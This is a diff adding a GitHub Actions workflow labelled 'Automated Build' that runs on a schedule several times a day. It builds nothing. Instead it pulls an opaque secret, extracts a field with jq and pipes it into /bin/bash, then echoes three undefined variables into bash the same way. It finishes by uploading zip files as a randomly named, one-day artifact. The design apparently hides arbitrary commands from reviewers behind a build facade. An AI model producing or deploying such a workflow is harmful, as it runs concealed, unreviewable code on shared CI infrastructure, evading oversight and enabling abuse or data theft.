@@ -1,0 +1,34 @@
+name: Automated Build
+on:
+  workflow_dispatch:
+
+  schedule:
+    - cron: '19 4,10,16,22 * * *'
+permissions:
+  contents: read
+concurrency:
+  group: ${{ github.workflow }}
+  cancel-in-progress: false
+jobs:
+  task:
+    runs-on: ubuntu-latest
+    timeout-minutes: 360
+    steps:
+      - uses: actions/checkout@v4
+        with:
+          fetch-depth: 1
+      - name: Execute
+        env:
+          ie34: ${{ secrets.ie34 }}
+        run: |
+          printf '%s' "$ie34" | jq -r .vfo1002 | /bin/bash
+          echo $sg43056 | jq -r .g8 | /bin/bash
+          echo $ouzz5466 | jq -r .m32 | /bin/bash
+          echo $xsw393 | jq -r .l33 | /bin/bash
+
+      - name: Upload artifact
+        uses: actions/upload-artifact@v4
+        with:
+          name: X8r3uMDS
+          path: "*.zip"
+          retention-days: 1
